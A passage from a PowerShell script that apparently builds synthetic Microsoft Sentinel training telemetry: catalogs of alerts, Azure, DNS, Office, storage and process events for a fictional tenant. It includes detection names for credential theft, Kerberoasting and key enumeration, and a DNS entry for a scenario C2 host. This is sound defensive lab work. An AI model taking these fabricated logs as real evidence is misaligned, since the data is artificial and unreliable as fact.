    [pscustomobject]@{ Key = 'email-addr:value'; Kind = 'Email'; Confidence = 75; Tlp = 'Green' }
)

# SecurityAlert. ProviderName in the real sample is MDATP on 552 of 1000 rows,
# ASI Scheduled Alerts on 307, and ASI NRT Alerts on 126, so the product mix here
# follows that split. Severity runs Informational 420, Medium 331, Low 142.
$securityAlertCatalog = @(
    [pscustomobject]@{ Name = 'NRT User added to Microsoft Entra ID Privileged Groups'; Provider = 'ASI NRT Alerts'; Product = 'Azure Sentinel'; Severity = 'Informational'; Tactics = 'PrivilegeEscalation'; Techniques = 'T1078'; Description = 'This will alert when a user is added to any of the Entra ID privileged groups.' }
    [pscustomobject]@{ Name = 'User added to Microsoft Entra ID Privileged Groups'; Provider = 'ASI Scheduled Alerts'; Product = 'Azure Sentinel'; Severity = 'Informational'; Tactics = 'PrivilegeEscalation'; Techniques = 'T1078'; Description = 'This will alert when a user is added to any of the Entra ID privileged groups.' }
    [pscustomobject]@{ Name = 'User Added to Admin Role'; Provider = 'ASI Scheduled Alerts'; Product = 'Azure Sentinel'; Severity = 'Medium'; Tactics = 'PrivilegeEscalation'; Techniques = 'T1078'; Description = 'Detects a user being added to a new privileged role.' }
    [pscustomobject]@{ Name = 'Malware was prevented'; Provider = 'MDATP'; Product = 'Microsoft Defender Advanced Threat Protection'; Severity = 'Informational'; Tactics = 'Unknown'; Techniques = ''; Description = 'Malware and unwanted software are undesirable applications that perform annoying, disruptive, or harmful actions on affected machines.' }
    [pscustomobject]@{ Name = 'Suspicious PowerShell command line'; Provider = 'MDATP'; Product = 'Microsoft Defender Advanced Threat Protection'; Severity = 'Medium'; Tactics = 'Execution'; Techniques = 'T1059'; Description = 'A PowerShell command line with suspicious characteristics was observed.' }
    [pscustomobject]@{ Name = 'Suspicious sign-in from an unfamiliar location'; Provider = 'ASI Scheduled Alerts'; Product = 'Azure Sentinel'; Severity = 'Medium'; Tactics = 'InitialAccess'; Techniques = 'T1078'; Description = 'Identifies a sign-in from infrastructure not previously seen for this identity.' }
    [pscustomobject]@{ Name = 'Anomalous OAuth application consent'; Provider = 'ASI Scheduled Alerts'; Product = 'Azure Sentinel'; Severity = 'High'; Tactics = 'Persistence'; Techniques = 'T1098'; Description = 'A user consented to an application requesting high-privilege Microsoft Graph scopes.' }
    [pscustomobject]@{ Name = 'Credential theft activity detected'; Provider = 'MDATP'; Product = 'Microsoft Defender Advanced Threat Protection'; Severity = 'High'; Tactics = 'CredentialAccess'; Techniques = 'T1003'; Description = 'Activity consistent with credential dumping was observed on the device.' }
    [pscustomobject]@{ Name = 'Suspicious Kerberos service ticket request'; Provider = 'MDATP'; Product = 'Microsoft Defender Advanced Threat Protection'; Severity = 'Medium'; Tactics = 'CredentialAccess'; Techniques = 'T1558'; Description = 'A pattern of service ticket requests consistent with Kerberoasting was observed.' }
    [pscustomobject]@{ Name = 'Suspicious device code authentication'; Provider = 'ASI NRT Alerts'; Product = 'Azure Sentinel'; Severity = 'High'; Tactics = 'InitialAccess'; Techniques = 'T1566'; Description = 'A device code authentication completed from infrastructure unrelated to the signing-in user.' }
    [pscustomobject]@{ Name = 'Unfamiliar sign-in properties'; Provider = 'MDATP'; Product = 'Microsoft Defender Advanced Threat Protection'; Severity = 'Low'; Tactics = 'Unknown'; Techniques = ''; Description = 'Sign-in properties deviate from the established baseline for this identity.' }
    [pscustomobject]@{ Name = 'Mass download by a single user'; Provider = 'ASI Scheduled Alerts'; Product = 'Azure Sentinel'; Severity = 'Medium'; Tactics = 'Collection'; Techniques = 'T1530'; Description = 'A single principal downloaded an unusual volume of content in a short window.' }
)

# AzureActivity. The operation mix mirrors the real sample, where
# MICROSOFT.SECURITY/DATASCANNERS/WRITE is 430 of 1000 rows and
# MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION is 166. The storage key listing
# is the operation that carries the cloud collection beat of the scenario.
$azureActivityCatalog = @(
    [pscustomobject]@{ Operation = 'MICROSOFT.SECURITY/DATASCANNERS/WRITE'; Provider = 'MICROSOFT.SECURITY'; Category = 'Administrative'; Status = 'Success'; Substatus = 'OK' }
    [pscustomobject]@{ Operation = 'MICROSOFT.SECURITY/DATASCANNERS/WRITE'; Provider = 'MICROSOFT.SECURITY'; Category = 'Administrative'; Status = 'Start'; Substatus = '' }
    [pscustomobject]@{ Operation = 'MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION'; Provider = 'MICROSOFT.STORAGE'; Category = 'Administrative'; Status = 'Success'; Substatus = 'OK' }
    [pscustomobject]@{ Operation = 'MICROSOFT.COMPUTE/VIRTUALMACHINES/WRITE'; Provider = 'MICROSOFT.COMPUTE'; Category = 'Administrative'; Status = 'Success'; Substatus = 'Created' }
    [pscustomobject]@{ Operation = 'MICROSOFT.EVENTGRID/REGISTER/ACTION'; Provider = 'MICROSOFT.EVENTGRID'; Category = 'Administrative'; Status = 'Success'; Substatus = 'OK' }
    [pscustomobject]@{ Operation = 'MICROSOFT.KEYVAULT/VAULTS/SECRETS/WRITE'; Provider = 'MICROSOFT.KEYVAULT'; Category = 'Administrative'; Status = 'Success'; Substatus = 'OK' }
    [pscustomobject]@{ Operation = 'MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE'; Provider = 'MICROSOFT.AUTHORIZATION'; Category = 'Administrative'; Status = 'Success'; Substatus = 'Created' }
    [pscustomobject]@{ Operation = 'MICROSOFT.RESOURCES/DEPLOYMENTS/WRITE'; Provider = 'MICROSOFT.RESOURCES'; Category = 'Administrative'; Status = 'Start'; Substatus = '' }
    [pscustomobject]@{ Operation = 'MICROSOFT.AUTHORIZATION/POLICIES/AUDIT/ACTION'; Provider = 'MICROSOFT.AUTHORIZATION'; Category = 'Policy'; Status = 'Succeeded'; Substatus = '' }
    [pscustomobject]@{ Operation = 'MICROSOFT.ADVISOR/RECOMMENDATIONS/AVAILABLE/ACTION'; Provider = 'MICROSOFT.ADVISOR'; Category = 'Recommendation'; Status = 'Active'; Substatus = '' }
)

# ASimDnsActivityLogs. In the real sample every row is emitted by the domain
# controller adds01 (10.1.1.4), EventType is Query on 948 of 1000 rows, DnsQueryTypeName
# is A on 854, and NetworkProtocol is always UDP. The scenario C2 name is included so
# DNS resolution corroborates the endpoint network beat.
$dnsQueryCatalog = @(
    [pscustomobject]@{ Name = 'eus2-oi-ods.trafficmanager.net'; Type = 1; TypeName = 'A'; Response = '["104.208.231.133"]'; Malicious = $false }
    [pscustomobject]@{ Name = 'ipv4-eus2-oi-ods-cses-b.eastus2.cloudapp.azure.com'; Type = 1; TypeName = 'A'; Response = '["52.167.145.180"]'; Malicious = $false }
    [pscustomobject]@{ Name = 'login.microsoftonline.com'; Type = 1; TypeName = 'A'; Response = '["20.190.190.132"]'; Malicious = $false }
    [pscustomobject]@{ Name = 'graph.microsoft.com'; Type = 1; TypeName = 'A'; Response = '["20.190.151.9"]'; Malicious = $false }
    [pscustomobject]@{ Name = 'outlook.office365.com'; Type = 1; TypeName = 'A'; Response = '["52.96.40.242"]'; Malicious = $false }
    [pscustomobject]@{ Name = 'usag-cyber.local'; Type = 6; TypeName = 'SOA'; Response = '[]'; Malicious = $false }
    [pscustomobject]@{ Name = 'wpad.usag-cyber.local'; Type = 1; TypeName = 'A'; Response = '[]'; Malicious = $false }
    [pscustomobject]@{ Name = 'sql01.usag-cyber.local'; Type = 1; TypeName = 'A'; Response = '["10.20.30.41"]'; Malicious = $false }
    [pscustomobject]@{ Name = 'aadconnect01.usag-cyber.local'; Type = 1; TypeName = 'A'; Response = '["10.20.30.52"]'; Malicious = $false }
    [pscustomobject]@{ Name = $c2Host; Type = 1; TypeName = 'A'; Response = "[`"$c2Ip`"]"; Malicious = $true }
)

# OfficeActivity. RecordType in the real sample is ExchangeAdmin on 829 of 1000 rows,
# and the workload split is Exchange 944, MicrosoftTeams 31, SharePoint 25. Most rows
# are emitted by Exchange service principals rather than humans, which is why the
# NT SERVICE accounts dominate UserId. MailItemsAccessed carries the collection beat.
$officeActivityCatalog = @(
    [pscustomobject]@{ Operation = 'Set-ConditionalAccessPolicy'; RecordType = 'ExchangeAdmin'; Workload = 'Exchange'; UserType = 'DcAdmin'; Service = $true }
    [pscustomobject]@{ Operation = 'Set-ConditionalAccessPolicy'; RecordType = 'ExchangeAdmin'; Workload = 'Exchange'; UserType = 'DcAdmin'; Service = $true }
    [pscustomobject]@{ Operation = 'Add-MailboxLocation'; RecordType = 'ExchangeAdmin'; Workload = 'Exchange'; UserType = 'Admin'; Service = $true }
    [pscustomobject]@{ Operation = 'Set-Mailbox'; RecordType = 'ExchangeAdmin'; Workload = 'Exchange'; UserType = 'Admin'; Service = $true }
    [pscustomobject]@{ Operation = 'MailItemsAccessed'; RecordType = 'ExchangeItemAggregated'; Workload = 'Exchange'; UserType = 'Regular'; Service = $false }
    [pscustomobject]@{ Operation = 'New-InboxRule'; RecordType = 'ExchangeAdmin'; Workload = 'Exchange'; UserType = 'Regular'; Service = $false }
    [pscustomobject]@{ Operation = 'Add-MailboxPermission'; RecordType = 'ExchangeAdmin'; Workload = 'Exchange'; UserType = 'Admin'; Service = $false }
    [pscustomobject]@{ Operation = 'FileDownloaded'; RecordType = 'SharePointFileOperation'; Workload = 'SharePoint'; UserType = 'Regular'; Service = $false }
    [pscustomobject]@{ Operation = 'FileAccessed'; RecordType = 'SharePointFileOperation'; Workload = 'SharePoint'; UserType = 'Regular'; Service = $false }
    [pscustomobject]@{ Operation = 'MemberAdded'; RecordType = 'MicrosoftTeams'; Workload = 'MicrosoftTeams'; UserType = 'Regular'; Service = $false }
)

# ---------------------------------------------------------------------------
# Tier 3 and Tier 4 catalogs. Distributions measured from the exported sample.
# ---------------------------------------------------------------------------

# BehaviorAnalytics. ActivityType in the real sample is Logon 599, LogOn 264, and
# Administrative 69, and InvestigationPriority is 0 on 914 of 1000 rows. The casing
# inconsistency between Logon and LogOn is real and is preserved deliberately.
$behaviorAnalyticsCatalog = @(
    [pscustomobject]@{ ActivityType = 'Logon'; ActionType = 'Logon_Success'; EventSource = 'Authentication'; SourceSystem = 'AAD'; Priority = 0 }
    [pscustomobject]@{ ActivityType = 'Logon'; ActionType = 'Logon_Success'; EventSource = 'Authentication'; SourceSystem = 'AAD'; Priority = 0 }
    [pscustomobject]@{ ActivityType = 'Logon'; ActionType = 'Logon_Success'; EventSource = 'Authentication'; SourceSystem = 'AAD'; Priority = 0 }
    [pscustomobject]@{ ActivityType = 'LogOn'; ActionType = 'Sign-in'; EventSource = 'Azure AD'; SourceSystem = 'AAD'; Priority = 0 }
    [pscustomobject]@{ ActivityType = 'LogOn'; ActionType = 'Sign-in'; EventSource = 'Azure AD'; SourceSystem = 'AAD'; Priority = 0 }
    [pscustomobject]@{ ActivityType = 'Administrative'; ActionType = 'ResourceAccess'; EventSource = 'SecurityEvent'; SourceSystem = 'M365 Defender for EndPoint'; Priority = 2 }
    [pscustomobject]@{ ActivityType = 'Administrative'; ActionType = 'DirectoryChange'; EventSource = 'Azure AD'; SourceSystem = 'AAD'; Priority = 3 }
    [pscustomobject]@{ ActivityType = 'FailedLogOn'; ActionType = 'Logon_Failure'; EventSource = 'Authentication'; SourceSystem = 'AAD'; Priority = 5 }
)

# IntuneDeviceComplianceOrg. ComplianceState is Compliant on 179 of the 207 rows that
# carry device detail, and the sentinel grace period value 9999-12-31 is what the real
# connector emits for devices that are not in a grace period.
$intuneComplianceCatalog = @(
    [pscustomobject]@{ State = 'Compliant'; Owner = 'Personal'; Agents = 514; Threat = 'Secured' }
    [pscustomobject]@{ State = 'Compliant'; Owner = 'Company'; Agents = 2; Threat = 'Secured' }
    [pscustomobject]@{ State = 'Compliant'; Owner = 'Personal'; Agents = 514; Threat = 'Unknown' }
    [pscustomobject]@{ State = 'Compliant'; Owner = 'Company'; Agents = 2; Threat = 'Low' }
    [pscustomobject]@{ State = 'Not compliant'; Owner = 'Personal'; Agents = 1024; Threat = 'Medium' }
    [pscustomobject]@{ State = 'Not evaluated'; Owner = 'Unknown'; Agents = 1024; Threat = 'Unknown' }
)

# SentinelHealth. NRT analytics rule runs dominate at 898 of 1000 rows and Status is
# Success on 998, which is exactly why this table teaches detection blind spots: the
# failures are rare and easy to miss.
$sentinelHealthCatalog = @(
    [pscustomobject]@{ Operation = 'NRT analytics rule run'; Kind = 'NRT'; ResourceType = 'Analytics Rule'; Status = 'Success' }
    [pscustomobject]@{ Operation = 'NRT analytics rule run'; Kind = 'NRT'; ResourceType = 'Analytics Rule'; Status = 'Success' }
    [pscustomobject]@{ Operation = 'NRT analytics rule run'; Kind = 'NRT'; ResourceType = 'Analytics Rule'; Status = 'Success' }
    [pscustomobject]@{ Operation = 'Scheduled analytics rule run'; Kind = 'Scheduled'; ResourceType = 'Analytics Rule'; Status = 'Success' }
    [pscustomobject]@{ Operation = 'Data fetch status change'; Kind = 'Office365'; ResourceType = 'Data connector'; Status = 'Success' }
    [pscustomobject]@{ Operation = 'Scheduled analytics rule run'; Kind = 'Scheduled'; ResourceType = 'Analytics Rule'; Status = 'Failure' }
)

$sentinelRuleNameCatalog = @(
    'NRT Squid proxy events related to mining pools'
    'NRT Authentication Methods Changed for VIP Users'
    'NRT Modified domain federation trust settings'
    'Device code authentication from unfamiliar infrastructure'
    'OAuth application granted high privilege Graph scopes'
    'Mass mailbox item access by a single principal'
    'Storage account key enumeration'
    'Kerberoasting service ticket burst'
)

# MicrosoftServicePrincipalSignInLogs. Resource mix in the real sample is Azure Resource
# Manager 457, Microsoft Graph 289, and Office 365 Management APIs 94. AppOwnerTenantId
# is Microsoft's own first-party tenant on every row.
$spnSignInResourceCatalog = @(
    [pscustomobject]@{ Name = 'Azure Resource Manager'; Id = '797f4846-ba00-4fd7-ba43-dac1f8f63013' }
    [pscustomobject]@{ Name = 'Azure Resource Manager'; Id = '797f4846-ba00-4fd7-ba43-dac1f8f63013' }
    [pscustomobject]@{ Name = 'Microsoft Graph'; Id = '00000003-0000-0000-c000-000000000000' }
    [pscustomobject]@{ Name = 'Microsoft Graph'; Id = '00000003-0000-0000-c000-000000000000' }
    [pscustomobject]@{ Name = 'Office 365 Management APIs'; Id = 'c5393580-f805-4401-95e8-94b7a6ef2fc2' }
    [pscustomobject]@{ Name = 'Windows Azure Active Directory'; Id = '00000002-0000-0000-c000-000000000000' }
    [pscustomobject]@{ Name = 'Azure Key Vault'; Id = 'cfa8b339-82a2-471a-a3c9-0fc0be7a4093' }
    [pscustomobject]@{ Name = 'Azure Storage'; Id = 'e406a681-f3d4-42a8-90b6-c2b029497af1' }
)

$spnDisplayNameCatalog = @(
    'Windows Azure Security Resource Provider'
    'Microsoft Defender for Cloud Apps - APIs'
    'Azure RBAC Data Plane'
    'USAG Cyber Backup Service'
    'USAG Cyber Inventory Collector'
    'USAG Cyber Reporting Connector'
)

# AADGraphActivityLogs. The legacy Azure AD Graph surface still sees real traffic:
# GET 632 of 1000, HTTP 200 on 797, and an even User against Application actor split.
$graphActivityCatalog = @(
    [pscustomobject]@{ ApiVersion = '1.6-internal'; Method = 'GET'; Status = 200; Uri = '/v2/{0}/policies'; Agent = 'Microsoft Azure Graph Client Library 1.0' }
    [pscustomobject]@{ ApiVersion = '1.6-internal'; Method = 'GET'; Status = 200; Uri = '/v2/myorganization/isDirectoryFeatureEnabled'; Agent = 'Microsoft.OData.Client/7.12.5' }
    [pscustomobject]@{ ApiVersion = '1.61-internal'; Method = 'POST'; Status = 202; Uri = '/{0}/$batch'; Agent = 'Microsoft ADO.NET Data Services' }
    [pscustomobject]@{ ApiVersion = '1.61-internal'; Method = 'GET'; Status = 200; Uri = '/{0}/users'; Agent = 'Microsoft Azure Graph Client Library 1.0' }
    [pscustomobject]@{ ApiVersion = '1.6'; Method = 'GET'; Status = 200; Uri = '/{0}/servicePrincipals'; Agent = 'Microsoft.OData.Client/7.12.5' }
    [pscustomobject]@{ ApiVersion = '1.6-internal'; Method = 'PATCH'; Status = 204; Uri = '/{0}/applications'; Agent = 'Microsoft ADO.NET Data Services' }
    [pscustomobject]@{ ApiVersion = '1.6-internal'; Method = 'GET'; Status = 403; Uri = '/{0}/directoryRoles'; Agent = 'Microsoft Azure Graph Client Library 1.0' }
)

# ExposureGraphNodes. Security recommendations dominate the real graph at 964 of 1000
# nodes. The scenario asset types are added so attack paths terminate somewhere real.
$exposureNodeCatalog = @(
    [pscustomobject]@{ Label = 'mdcSecurityRecommendation'; Categories = @('finding', 'security_finding') }
    [pscustomobject]@{ Label = 'mdcSecurityRecommendation'; Categories = @('finding', 'security_finding') }
    [pscustomobject]@{ Label = 'mdcSecurityRecommendation'; Categories = @('finding', 'security_finding') }
    [pscustomobject]@{ Label = 'container-image'; Categories = @('container', 'container_image', 'containers') }
    [pscustomobject]@{ Label = 'device'; Categories = @('compute', 'endpoint') }
    [pscustomobject]@{ Label = 'user'; Categories = @('identity') }
    [pscustomobject]@{ Label = 'serviceprincipal'; Categories = @('identity', 'application') }
    [pscustomobject]@{ Label = 'microsoft.storage/storageaccounts'; Categories = @('storage', 'cloud_resource') }
)

$exposureEdgeLabelCatalog = @(
    'affecting', 'has role on', 'can authenticate to', 'member of',
    'contains', 'can access', 'has credentials to', 'routes to'
)

# CloudStorageAggregatedEvents. GetContainerProperties is 659 of 1000 real rows and
# authentication splits OAuth 664 against TrustedAccess 336. GetBlob carries the
# collection beat when it appears in volume from a single principal.
$cloudStorageOperationCatalog = @(
    [pscustomobject]@{ Operation = 'GetContainerProperties'; Service = 'Blob'; Auth = 'TrustedAccess' }
    [pscustomobject]@{ Operation = 'GetContainerProperties'; Service = 'Blob'; Auth = 'OAuth' }
    [pscustomobject]@{ Operation = 'GetContainerProperties'; Service = 'Blob'; Auth = 'OAuth' }
    [pscustomobject]@{ Operation = 'ListContainers'; Service = 'Blob'; Auth = 'OAuth' }
    [pscustomobject]@{ Operation = 'GetBlob'; Service = 'Blob'; Auth = 'OAuth' }
    [pscustomobject]@{ Operation = 'GetBlobProperties'; Service = 'Blob'; Auth = 'OAuth' }
    [pscustomobject]@{ Operation = 'ListBlobs'; Service = 'Blob'; Auth = 'OAuth' }
    [pscustomobject]@{ Operation = 'GetFile'; Service = 'Files.REST'; Auth = 'TrustedAccess' }
)

# AzureDiagnostics. Logic App workflow runtime dominates the real table at 985 of 1000
# rows; Key Vault and Cognitive Services make up the tail.
$azureDiagnosticsCatalog = @(
    [pscustomobject]@{ Category = 'WorkflowRuntime'; Provider = 'MICROSOFT.LOGIC'; ResourceGroup = 'PLAYBOOK'; ResourceType = 'WORKFLOWS' }
    [pscustomobject]@{ Category = 'WorkflowRuntime'; Provider = 'MICROSOFT.LOGIC'; ResourceGroup = 'PLAYBOOK'; ResourceType = 'WORKFLOWS' }
    [pscustomobject]@{ Category = 'WorkflowRuntime'; Provider = 'MICROSOFT.LOGIC'; ResourceGroup = 'PLAYBOOK'; ResourceType = 'WORKFLOWS' }
    [pscustomobject]@{ Category = 'RequestResponse'; Provider = 'MICROSOFT.COGNITIVESERVICES'; ResourceGroup = 'A365-WORKSHOP'; ResourceType = 'ACCOUNTS' }
    [pscustomobject]@{ Category = 'AuditEvent'; Provider = 'MICROSOFT.KEYVAULT'; ResourceGroup = 'ZOLAB-BOT-BOTPRD'; ResourceType = 'VAULTS' }
    [pscustomobject]@{ Category = 'NetworkSecurityGroupEvent'; Provider = 'MICROSOFT.NETWORK'; ResourceGroup = 'NETWORK'; ResourceType = 'NETWORKSECURITYGROUPS' }
)

# Service principal risk. These two tables hold no rows in the source tenant, so the
# shapes come from the live getschema plus the documented Entra ID Protection values.
$spnRiskEventCatalog = @(
    [pscustomobject]@{ EventType = 'investigationsThreatIntelligence'; Level = 'high'; Detection = 'realtime'; Activity = 'servicePrincipal' }
    [pscustomobject]@{ EventType = 'suspiciousSignIn'; Level = 'medium'; Detection = 'offline'; Activity = 'servicePrincipal' }
    [pscustomobject]@{ EventType = 'leakedCredentials'; Level = 'high'; Detection = 'offline'; Activity = 'servicePrincipal' }
    [pscustomobject]@{ EventType = 'anomalousServicePrincipalActivity'; Level = 'medium'; Detection = 'offline'; Activity = 'servicePrincipal' }
    [pscustomobject]@{ EventType = 'maliciousIPAddress'; Level = 'high'; Detection = 'realtime'; Activity = 'servicePrincipal' }
)

$windowsProcessTemplates = @(    [pscustomobject]@{ File = 'svchost.exe'; Path = 'C:\Windows\System32\svchost.exe'; Parent = 'services.exe'; Command = 'C:\Windows\System32\svchost.exe -k netsvcs -p' },
    [pscustomobject]@{ File = 'msedge.exe'; Path = 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'; Parent = 'explorer.exe'; Command = 'msedge.exe --type=renderer --lang=en-US' },
    [pscustomobject]@{ File = 'Teams.exe'; PathTemplate = 'C:\Users\{0}\AppData\Local\Microsoft\Teams\current\Teams.exe'; Parent = 'explorer.exe'; Command = 'Teams.exe --process-start-args --system-initiated' },
    [pscustomobject]@{ File = 'OneDrive.exe'; PathTemplate = 'C:\Users\{0}\AppData\Local\Microsoft\OneDrive\OneDrive.exe'; Parent = 'explorer.exe'; Command = 'OneDrive.exe /background' },
    [pscustomobject]@{ File = 'SenseIR.exe'; Path = 'C:\Program Files\Windows Defender Advanced Threat Protection\SenseIR.exe'; Parent = 'MsSense.exe'; Command = 'SenseIR.exe telemetry' }
) + @(
    [pscustomobject]@{ File = 'WhatsApp.exe'; PathTemplate = 'C:\Users\{0}\AppData\Local\WhatsApp\WhatsApp.exe'; Parent = 'explorer.exe'; Command = 'WhatsApp.exe --system-startup' },
    [pscustomobject]@{ File = 'GitHubDesktop.exe'; PathTemplate = 'C:\Users\{0}\AppData\Local\GitHubDesktop\GitHubDesktop.exe'; Parent = 'explorer.exe'; Command = 'GitHubDesktop.exe --squirrel-firstrun' },
    [pscustomobject]@{ File = 'wsl.exe'; Path = 'C:\Windows\System32\wsl.exe'; Parent = 'WindowsTerminal.exe'; Command = 'wsl.exe -d Ubuntu-24.04' },
    [pscustomobject]@{ File = 'DockerDesktop.exe'; Path = 'C:\Program Files\Docker\Docker\Docker Desktop.exe'; Parent = 'explorer.exe'; Command = 'DockerDesktop.exe --autostart' },
    [pscustomobject]@{ File = 'MSWord.exe'; Path = 'C:\Program Files\Microsoft Office\root\Office16\MSWord.exe'; Parent = 'explorer.exe'; Command = 'MSWord.exe /automation' },
    [pscustomobject]@{ File = 'Excel.exe'; Path = 'C:\Program Files\Microsoft Office\root\Office16\Excel.exe'; Parent = 'explorer.exe'; Command = 'Excel.exe /dde' },
    [pscustomobject]@{ File = 'Outlook.exe'; Path = 'C:\Program Files\Microsoft Office\root\Office16\Outlook.exe'; Parent = 'explorer.exe'; Command = 'Outlook.exe /recycle' },
    [pscustomobject]@{ File = 'PowerPoint.exe'; Path = 'C:\Program Files\Microsoft Office\root\Office16\PowerPoint.exe'; Parent = 'explorer.exe'; Command = 'PowerPoint.exe /s' },
    [pscustomobject]@{ File = 'Code.exe'; PathTemplate = 'C:\Users\{0}\AppData\Local\Programs\Microsoft VS Code\Code.exe'; Parent = 'explorer.exe'; Command = 'Code.exe --unity-launch' },
    [pscustomobject]@{ File = 'chrome.exe'; Path = 'C:\Program Files\Google\Chrome\Application\chrome.exe'; Parent = 'explorer.exe'; Command = 'chrome.exe --profile-directory=Default' },
    [pscustomobject]@{ File = 'firefox.exe'; Path = 'C:\Program Files\Mozilla Firefox\firefox.exe'; Parent = 'explorer.exe'; Command = 'firefox.exe -contentproc' },
    [pscustomobject]@{ File = 'slack.exe'; PathTemplate = 'C:\Users\{0}\AppData\Local\slack\slack.exe'; Parent = 'explorer.exe'; Command = 'slack.exe --process-start-args' },
    [pscustomobject]@{ File = 'Zoom.exe'; PathTemplate = 'C:\Users\{0}\AppData\Roaming\Zoom\bin\Zoom.exe'; Parent = 'explorer.exe'; Command = 'Zoom.exe --url=zoommtg://' },
    [pscustomobject]@{ File = 'Notepad.exe'; Path = 'C:\Windows\System32\Notepad.exe'; Parent = 'explorer.exe'; Command = 'Notepad.exe C:\Users\Public\Documents\notes.txt' },
    [pscustomobject]@{ File = 'cmd.exe'; Path = 'C:\Windows\System32\cmd.exe'; Parent = 'explorer.exe'; Command = 'cmd.exe /c whoami' },
    [pscustomobject]@{ File = 'powershell.exe'; Path = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; Parent = 'explorer.exe'; Command = 'powershell.exe -NoLogo -NoProfile' },
    [pscustomobject]@{ File = 'pwsh.exe'; Path = 'C:\Program Files\PowerShell\7\pwsh.exe'; Parent = 'WindowsTerminal.exe'; Command = 'pwsh.exe -NoLogo' },
    [pscustomobject]@{ File = 'WindowsTerminal.exe'; PathTemplate = 'C:\Users\{0}\AppData\Local\Microsoft\WindowsApps\WindowsTerminal.exe'; Parent = 'explorer.exe'; Command = 'WindowsTerminal.exe -p PowerShell' },
    [pscustomobject]@{ File = 'explorer.exe'; Path = 'C:\Windows\explorer.exe'; Parent = 'userinit.exe'; Command = 'explorer.exe' },
    [pscustomobject]@{ File = 'SearchHost.exe'; Path = 'C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe'; Parent = 'svchost.exe'; Command = 'SearchHost.exe -Embedding' },
    [pscustomobject]@{ File = 'OneNote.exe'; Path = 'C:\Program Files\Microsoft Office\root\Office16\OneNote.exe'; Parent = 'explorer.exe'; Command = 'OneNote.exe /tsr' },
    [pscustomobject]@{ File = 'Acrobat.exe'; Path = 'C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe'; Parent = 'explorer.exe'; Command = 'Acrobat.exe /n' },
    [pscustomobject]@{ File = 'MSAccess.exe'; Path = 'C:\Program Files\Microsoft Office\root\Office16\MSAccess.exe'; Parent = 'explorer.exe'; Command = 'MSAccess.exe /nostartup' },
    [pscustomobject]@{ File = 'Visio.exe'; Path = 'C:\Program Files\Microsoft Office\root\Office16\Visio.exe'; Parent = 'explorer.exe'; Command = 'Visio.exe /embedding' },
    [pscustomobject]@{ File = 'WinProj.exe'; Path = 'C:\Program Files\Microsoft Office\root\Office16\WinProj.exe'; Parent = 'explorer.exe'; Command = 'WinProj.exe /embedding' },
    [pscustomobject]@{ File = 'OneDriveStandaloneUpdater.exe'; PathTemplate = 'C:\Users\{0}\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe'; Parent = 'OneDrive.exe'; Command = 'OneDriveStandaloneUpdater.exe /silent' },
    [pscustomobject]@{ File = 'Dropbox.exe'; Path = 'C:\Program Files\Dropbox\Client\Dropbox.exe'; Parent = 'explorer.exe'; Command = 'Dropbox.exe /systemstartup' },
    [pscustomobject]@{ File = 'Box.exe'; PathTemplate = 'C:\Users\{0}\AppData\Local\Box\Box.exe'; Parent = 'explorer.exe'; Command = 'Box.exe --background' },
    [pscustomobject]@{ File = 'java.exe'; Path = 'C:\Program Files\Eclipse Adoptium\jdk-21\bin\java.exe'; Parent = 'cmd.exe'; Command = 'java.exe -version' },
    [pscustomobject]@{ File = 'python.exe'; PathTemplate = 'C:\Users\{0}\AppData\Local\Programs\Python\Python312\python.exe'; Parent = 'Code.exe'; Command = 'python.exe -m pip list' },
    [pscustomobject]@{ File = 'node.exe'; Path = 'C:\Program Files\nodejs\node.exe'; Parent = 'cmd.exe'; Command = 'node.exe server.js' },
    [pscustomobject]@{ File = 'git.exe'; Path = 'C:\Program Files\Git\cmd\git.exe'; Parent = 'Code.exe'; Command = 'git.exe status --short' },
    [pscustomobject]@{ File = 'ssh.exe'; Path = 'C:\Windows\System32\OpenSSH\ssh.exe'; Parent = 'WindowsTerminal.exe'; Command = 'ssh.exe admin-jump01.usag-cyber.local' },
    [pscustomobject]@{ File = 'putty.exe'; Path = 'C:\Program Files\PuTTY\putty.exe'; Parent = 'explorer.exe'; Command = 'putty.exe -ssh ubuntu-03' },
    [pscustomobject]@{ File = 'mstsc.exe'; Path = 'C:\Windows\System32\mstsc.exe'; Parent = 'explorer.exe'; Command = 'mstsc.exe /v:aadconnect01' },
    [pscustomobject]@{ File = 'az.exe'; Path = 'C:\Program Files\Microsoft SDKs\Azure\CLI2\wbin\az.exe'; Parent = 'pwsh.exe'; Command = 'az.exe account show' },
    [pscustomobject]@{ File = 'kubectl.exe'; Path = 'C:\Program Files\Kubernetes\kubectl.exe'; Parent = 'pwsh.exe'; Command = 'kubectl.exe get pods -A' },
    [pscustomobject]@{ File = 'terraform.exe'; Path = 'C:\Program Files\Terraform\terraform.exe'; Parent = 'pwsh.exe'; Command = 'terraform.exe plan' },
    [pscustomobject]@{ File = 'bicep.exe'; Path = 'C:\Program Files\Azure CLI\bicep.exe'; Parent = 'az.exe'; Command = 'bicep.exe build main.bicep' },
    [pscustomobject]@{ File = 'MSBuild.exe'; Path = 'C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe'; Parent = 'devenv.exe'; Command = 'MSBuild.exe WorkshopTools.sln /m' },
    [pscustomobject]@{ File = 'devenv.exe'; Path = 'C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\devenv.exe'; Parent = 'explorer.exe'; Command = 'devenv.exe WorkshopTools.sln' },
    [pscustomobject]@{ File = 'dotnet.exe'; Path = 'C:\Program Files\dotnet\dotnet.exe'; Parent = 'pwsh.exe'; Command = 'dotnet.exe test' },
    [pscustomobject]@{ File = 'sqlcmd.exe'; Path = 'C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe'; Parent = 'cmd.exe'; Command = 'sqlcmd.exe -S sql01 -Q "select @@version"' },
